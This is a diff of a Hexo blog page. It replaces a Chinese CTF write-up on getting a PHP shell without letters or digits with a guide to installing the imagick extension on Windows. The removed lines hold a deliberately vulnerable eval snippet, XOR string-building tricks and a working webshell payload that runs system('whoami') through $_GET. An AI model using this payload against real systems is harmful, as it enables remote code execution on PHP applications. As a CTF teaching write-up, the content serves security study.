@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="ctf,">
+  <meta name="keywords" content="Hexo, NexT">
 
 
 
@@ -79,18 +79,21 @@
 
 
 
-<meta name="description" content="最近看到一个ctf题目，关于无字母数字获取shell的，记录一下12345678910111213141516&amp;lt;?phpinclude &amp;apos;flag.php&amp;apos;;if(isset($_GET[&amp;apos;code&amp;apos;]))&amp;#123;    $code = $_GET[&amp;apos;code&amp;apos;];    if(strlen($code)&amp;gt;40)&amp;#123">
-<meta name="keywords" content="ctf">
+<meta name="description" content="0x00 前言在安装之前还特意在manual上查看了一下安装过程下载dll-&amp;gt;copy到php扩展目录-&amp;gt;添加配置到php.ini然而事情并没有那么简单– 0x01 踩坑之旅上述方法无效后就开始了愉快的网上冲浪环节，在前人的记录中，找到需要安装ImageMagick控件。然而安装后还是出现运行php -m还是出现了无法加载模块的错误然后又有前人记载，可能是imagemakick版本太高">
 <meta property="og:type" content="article">
-<meta property="og:title" content="无字母数字shell">
-<meta property="og:url" content="http://yoursite.com/2018/08/08/无字母数字shell/index.html">
+<meta property="og:title" content="windows+apache+php7.0安装php扩展之imagick踩过的大坑">
+<meta property="og:url" content="http://yoursite.com/2019/02/26/windows-apache-php7-0安装php扩展之imagick踩过的大坑/index.html">
 <meta property="og:site_name" content="Boogle&#39;s Blogs">
-<meta property="og:description" content="最近看到一个ctf题目，关于无字母数字获取shell的，记录一下12345678910111213141516&amp;lt;?phpinclude &amp;apos;flag.php&amp;apos;;if(isset($_GET[&amp;apos;code&amp;apos;]))&amp;#123;    $code = $_GET[&amp;apos;code&amp;apos;];    if(strlen($code)&amp;gt;40)&amp;#123">
+<meta property="og:description" content="0x00 前言在安装之前还特意在manual上查看了一下安装过程下载dll-&amp;gt;copy到php扩展目录-&amp;gt;添加配置到php.ini然而事情并没有那么简单– 0x01 踩坑之旅上述方法无效后就开始了愉快的网上冲浪环节，在前人的记录中，找到需要安装ImageMagick控件。然而安装后还是出现运行php -m还是出现了无法加载模块的错误然后又有前人记载，可能是imagemakick版本太高">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-02-21T07:33:02.891Z">
+<meta property="og:image" content="https://i.loli.net/2019/02/26/5c74adfcdfb2a.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/26/5c74b350692b4.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/26/5c74b3a35337b.png">
+<meta property="og:updated_time" content="2019-02-26T03:40:14.569Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="无字母数字shell">
-<meta name="twitter:description" content="最近看到一个ctf题目，关于无字母数字获取shell的，记录一下12345678910111213141516&amp;lt;?phpinclude &amp;apos;flag.php&amp;apos;;if(isset($_GET[&amp;apos;code&amp;apos;]))&amp;#123;    $code = $_GET[&amp;apos;code&amp;apos;];    if(strlen($code)&amp;gt;40)&amp;#123">
+<meta name="twitter:title" content="windows+apache+php7.0安装php扩展之imagick踩过的大坑">
+<meta name="twitter:description" content="0x00 前言在安装之前还特意在manual上查看了一下安装过程下载dll-&amp;gt;copy到php扩展目录-&amp;gt;添加配置到php.ini然而事情并没有那么简单– 0x01 踩坑之旅上述方法无效后就开始了愉快的网上冲浪环节，在前人的记录中，找到需要安装ImageMagick控件。然而安装后还是出现运行php -m还是出现了无法加载模块的错误然后又有前人记载，可能是imagemakick版本太高">
+<meta name="twitter:image" content="https://i.loli.net/2019/02/26/5c74adfcdfb2a.png">
 
 
 
@@ -120,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/08/08/无字母数字shell/">
+  <link rel="canonical" href="http://yoursite.com/2019/02/26/windows-apache-php7-0安装php扩展之imagick踩过的大坑/">
 
 
 
 
 
-  <title>无字母数字shell | Boogle's Blogs</title>
+  <title>windows+apache+php7.0安装php扩展之imagick踩过的大坑 | Boogle's Blogs</title>
   
 
 
@@ -233,7 +236,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/08/无字母数字shell/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/26/windows-apache-php7-0安装php扩展之imagick踩过的大坑/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="boogle">
@@ -250,7 +253,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">无字母数字shell</h1>
+          <h1 class="post-title" itemprop="name headline">windows+apache+php7.0安装php扩展之imagick踩过的大坑</h1>
         
 
         <div class="post-meta">
@@ -262,8 +265,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-08T15:31:52+08:00">
-                2018-08-08
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-26T11:37:27+08:00">
+                2019-02-26
               </time>
             
 
@@ -285,8 +288,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">web安全</span>
+                  <a href="/categories/环境配置/" itemprop="url" rel="index">
+                    <span itemprop="name">环境配置</span>
                   </a>
                 </span>
 
@@ -322,12 +325,20 @@
       
 
       
-        <p>最近看到一个ctf题目，关于无字母数字获取shell的，记录一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">//$hint =  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>代码进行了字母数字过滤，并且限制了输入长度。<br>那么按照我们利用异或和php弱类型的一些特性，将符号转换为字母，再拼接函数，或者我们想要利用的webshell;<br>下面进行简单的演示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;g&apos;^&apos;&lt;&apos;;                   //  输出结果为 [ </span><br><span class="line">echo &apos;[&apos;^&apos;&lt;&apos;;                   //  这样便可以得到 g</span><br><span class="line">echo (&apos;[&apos;^&apos;&lt;&apos;).(&apos;:&apos;^&apos;_&apos;);       //  拼接之后得到  ge</span><br><span class="line">echo &apos;[:&apos;^&apos;&lt;_&apos;;                 //  为了减少长度，这样同样可以输出与上面相同的效果 ge</span><br><span class="line"></span><br><span class="line">echo &apos;[:[:,_]&apos;^&apos;&lt;_/|@&gt;:&apos;;//  构造出getFlag,而此时仅用了19个字符的长度</span><br></pre></td></tr></table></figure></p>
-<p>那么重点来了，既然我们已经构造出了getFlag，再加个()，拼接进去()不是就能直接读取题目的flag了,确实是这样，但如果直接拼进字符串是没有效果的，其只能作为字符串而不能被当作函数，我们还要进行适当的拼接。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_ = &apos;[:[:,_]&apos;^&apos;&lt;_/|@&gt;:&apos;;       //  getFlag</span><br><span class="line">$_();                           //  getFlag()  这样就会变成函数了</span><br></pre></td></tr></table></figure></p>
-<p>那么我们最终的payload即为：<strong>?code=$<em>=’[:[:,</em>]’^’&lt;<em>/|@&gt;:’;$</em>();</strong></p>
-<p>这样仅仅是调用了一个输出flag的函数，那么我们要是在实际环境中想继续利用的话，我们需要构造出一个webshell。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;               // _GET</span><br><span class="line">$&#123;$_&#125;[_]($&#123;$_&#125;[__]);            // $_GET[_]($GET_[__])</span><br></pre></td></tr></table></figure></p>
-<p>这样就突破了code的长度限制，利用get传入两个变量，一个作为函数名，一个作为函数参数。就可以实现一个任意代码执行了。<br>例如利用system执行系统命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=system&amp;__=whoami</span><br></pre></td></tr></table></figure></p>
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在安装之前还特意在<a href="http://php.net/manual/zh/imagick.setup.php" target="_blank" rel="noopener">manual</a>上查看了一下安装过程<br><img src="https://i.loli.net/2019/02/26/5c74adfcdfb2a.png" alt><br><code>下载dll-&gt;copy到php扩展目录-&gt;添加配置到php.ini</code><br>然而事情并没有那么简单–</p>
+<h2 id="0x01-踩坑之旅"><a href="#0x01-踩坑之旅" class="headerlink" title="0x01 踩坑之旅"></a>0x01 踩坑之旅</h2><p>上述方法无效后就开始了愉快的网上冲浪环节，在前人的记录中，找到需要安装<code>ImageMagick</code>控件。<br>然而安装后还是出现运行<code>php -m</code>还是出现了无法加载模块的错误<br>然后又有前人记载，可能是imagemakick版本太高的原因，然后又进行降级安装，此时又爆出弹窗错误，提示无法定位到dll。<br>其中部分环节过于血腥忘记了一部分。</p>
+<h2 id="0x02-正确姿势"><a href="#0x02-正确姿势" class="headerlink" title="0x02 正确姿势"></a>0x02 正确姿势</h2><ul>
+<li>首先下载安装<code>ImageMagick-6.7.5-0-Q8-windows-dll</code><a href="https://ftp.icm.edu.pl/packages/ImageMagick/binaries/" target="_blank" rel="noopener">https://ftp.icm.edu.pl/packages/ImageMagick/binaries/</a> 建议版本不要过高，安装时采用默认安装便会将目录添加到环境变量。</li>
+<li>将目录下的所有 <code>CORE_RL_*.dll</code>复制到<code>apache/bin</code>目录下</li>
+<li>下载php扩展imagick<a href="http://pecl.php.net/package/imagick/3.4.1/windows" target="_blank" rel="noopener">http://pecl.php.net/package/imagick/3.4.1/windows</a>，按照需要选择版本</li>
+<li>将解压后目录内的<code>php_imagick.dll</code>放到php扩展目录<code>ext</code>下</li>
+<li>添加<code>extension=php_imagick.dll</code>到<code>php.ini</code>文件</li>
+<li>将目录内的八个<code>CORE_RL_*.dll</code>文件复制到<code>php.exe</code>所在目录</li>
+<li>重启apache,必要条件下需要重启计算机。查看phpinfo当<code>$_SERVER[&#39;PATH&#39;]</code>中不包含<code>ImageMagick</code>的环境变量时重启</li>
+<li>运行<code>php -m| findstr imagick</code>或者<code>php -i | findstr imagick</code>或者<code>phpinfo()</code>查看是否成功<h2 id="0x03-成功截图"><a href="#0x03-成功截图" class="headerlink" title="0x03 成功截图"></a>0x03 成功截图</h2></li>
+</ul>
+<p><code>php -i| findstr imagick</code></p>
+<p><img src="https://i.loli.net/2019/02/26/5c74b350692b4.png" alt><br><code>phpinfo</code><br><img src="https://i.loli.net/2019/02/26/5c74b3a35337b.png" alt></p>
 
       
     </div>
@@ -343,12 +354,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/ctf/" rel="tag"># ctf</a>
-          
-        </div>
-      
 
       
       
@@ -358,8 +363,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/08/08/seacms-v6-45-前台任意代码执行漏洞/" rel="next" title="seacms v6.45 前台任意代码执行漏洞">
-                <i class="fa fa-chevron-left"></i> seacms v6.45 前台任意代码执行漏洞
+              <a href="/2019/02/21/ECShop2-x-从sql注入到代码执行/" rel="next" title="ECShop2.x 从sql注入到代码执行">
+                <i class="fa fa-chevron-left"></i> ECShop2.x 从sql注入到代码执行
               </a>
             
           </div>
@@ -367,10 +372,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/08/23/域渗透-IPC/" rel="prev" title="域渗透 IPC$">
-                域渗透 IPC$ <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -422,8 +423,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -483,6 +493,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-踩坑之旅"><span class="nav-number">2.</span> <span class="nav-text">0x01 踩坑之旅</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-正确姿势"><span class="nav-number">3.</span> <span class="nav-text">0x02 正确姿势</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-成功截图"><span class="nav-number">4.</span> <span class="nav-text">0x03 成功截图</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
